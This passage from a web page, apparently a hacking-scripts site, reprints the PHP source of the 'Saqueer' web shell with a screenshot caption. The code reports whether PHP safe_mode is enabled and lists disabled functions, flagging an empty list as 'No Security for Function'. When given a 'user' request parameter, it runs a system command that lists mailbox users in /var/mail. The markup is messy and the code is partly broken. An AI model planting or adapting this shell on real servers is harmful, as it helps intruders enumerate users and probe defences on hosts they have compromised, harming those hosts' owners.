	&lt;font size="4"&gt;Safe Mode&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
	&lt;strong&gt;
&lt;?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?&gt;	
	&lt;/strong&gt;	
	&lt;/td&gt;
    				&lt;/tr&gt;
    &lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;Function&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
	&lt;strong&gt;
&lt;?php
if(''==($func=@ini_get('disable_functions')))
{
echo "&lt;font color=#00800F&gt;No Security for Function&lt;/font&gt;&lt;/b&gt;";
}else{
echo "&lt;font color=red&gt;$func&lt;/font&gt;&lt;/b&gt;";
}
?&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&nbsp;&lt;/td&gt;
    &lt;/table&gt;
    &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/table&gt;
	
	
	
	
	&lt;meta http-equiv="content-type" content="text/html; charset=UTF-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;





      &lt;form style="border: 0px ridge #FFFFFF"&gt;




    &lt;p align="center"&gt;&lt;/td&gt;
  &lt;/tr&gt;&lt;div align="center"&gt;

                &lt;tr&gt;



&lt;input type="submit"   name="user" value="user"&gt;&lt;option value="name"&gt;&lt;/select&gt;
&lt;/form&gt;


&lt;div align="center"&gt;
 &lt;table border="5" width="10%" bordercolorlight="#008000" bordercolordark="#006A00" height="100" cellspacing="5"&gt;
&lt;tr&gt;
&lt;td bordercolorlight="#008000" bordercolordark="#006A00"&gt;
&lt;p align="left"&gt;
&lt;textarea  method='POST' rows="25" name="S1" cols="16"&gt;


&lt;?php



      if ($_GET['user'] )


      system('ls /var/mail');





                                           for($uid=0;$uid&lt;90000;$uid++){

                                        }




?&gt;&lt;/textarea&gt;&lt;/table&gt;
	&lt;strong&gt;
	&lt;h3&gt;&lt;font size="6" color="#333333"&gt;&lt; Coded By SaQEeR aL jNoOoB &gt;&lt;/font&gt;&lt;/h3&gt;
	&lt;/strong&gt;
	&lt;p&gt;nbsp;
</pre>

## Saqueer shell screenshot<figure id="attachment_440" style="width: 541px;" class="wp-caption aligncenter">

[<img src="http://hackingscripts.com/wp/wp-content/uploads/2014/02/Saqueer-shell-541x1024.png" alt="Saqueer shell screenshot" width="541" height="1024" class="size-large wp-image-440" />][1]<figcaption class="wp-caption-text">Saqueer shell screenshot</figcaption></figure>

 [1]: http://hackingscripts.com/wp/wp-content/uploads/2014/02/Saqueer-shell.png